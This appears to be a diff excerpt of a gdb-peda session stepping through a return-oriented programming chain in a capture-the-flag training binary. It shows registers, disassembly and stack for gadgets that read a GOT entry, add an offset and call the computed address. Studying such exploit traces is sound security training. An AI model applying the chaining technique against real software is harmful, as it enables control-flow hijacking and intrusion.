+EDX: 0xf7731854 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x0
+ESP: 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:       mov    eax,DWORD PTR [eax])
+EIP: 0x80488c1 (<usefulGadgets+1>:      ret)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80488bc:   xchg   ax,ax
+   0x80488be:   xchg   ax,ax
+   0x80488c0 <usefulGadgets>:   pop    eax
+=> 0x80488c1 <usefulGadgets+1>: ret
+   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
+   0x80488c3 <usefulGadgets+3>: ret
+   0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
+   0x80488c6 <usefulGadgets+6>: ret
+[------------------------------------stack-------------------------------------]
+0000| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
+0004| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
+0008| 0xf755cf24 --> 0x1f7
+0012| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
+0016| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
+0020| 0xf755cf30 --> 0xa ('\n')
+0024| 0xf755cf34 --> 0x0
+0028| 0xf755cf38 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080488c1 in usefulGadgets ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a024 --> 0xf7772770 (<foothold_function>:     push   ebp)
+EBX: 0x0
+ECX: 0x54 ('T')
+EDX: 0xf7731854 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x0
+ESP: 0xf755cf20 --> 0x8048571 (<_init+33>:      pop    ebx)
+EIP: 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80488c1 <usefulGadgets+1>: ret
+   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
+   0x80488c3 <usefulGadgets+3>: ret
+=> 0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
+   0x80488c6 <usefulGadgets+6>: ret
+   0x80488c7 <usefulGadgets+7>: add    eax,ebx
+   0x80488c9 <usefulGadgets+9>: ret
+   0x80488ca <usefulGadgets+10>:        xchg   ax,ax
+[------------------------------------stack-------------------------------------]
+0000| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
+0004| 0xf755cf24 --> 0x1f7
+0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
+0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
+0016| 0xf755cf30 --> 0xa ('\n')
+0020| 0xf755cf34 --> 0x0
+0024| 0xf755cf38 --> 0x0
+0028| 0xf755cf3c --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080488c4 in usefulGadgets ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7772770 (<foothold_function>:   push   ebp)
+EBX: 0x0
+ECX: 0x54 ('T')
+EDX: 0xf7731854 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x0
+ESP: 0xf755cf20 --> 0x8048571 (<_init+33>:      pop    ebx)
+EIP: 0x80488c6 (<usefulGadgets+6>:      ret)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
+   0x80488c3 <usefulGadgets+3>: ret
+   0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
+=> 0x80488c6 <usefulGadgets+6>: ret
+   0x80488c7 <usefulGadgets+7>: add    eax,ebx
+   0x80488c9 <usefulGadgets+9>: ret
+   0x80488ca <usefulGadgets+10>:        xchg   ax,ax
+   0x80488cc <usefulGadgets+12>:        xchg   ax,ax
+[------------------------------------stack-------------------------------------]
+0000| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
+0004| 0xf755cf24 --> 0x1f7
+0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
+0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
+0016| 0xf755cf30 --> 0xa ('\n')
+0020| 0xf755cf34 --> 0x0
+0024| 0xf755cf38 --> 0x0
+0028| 0xf755cf3c --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080488c6 in usefulGadgets ()
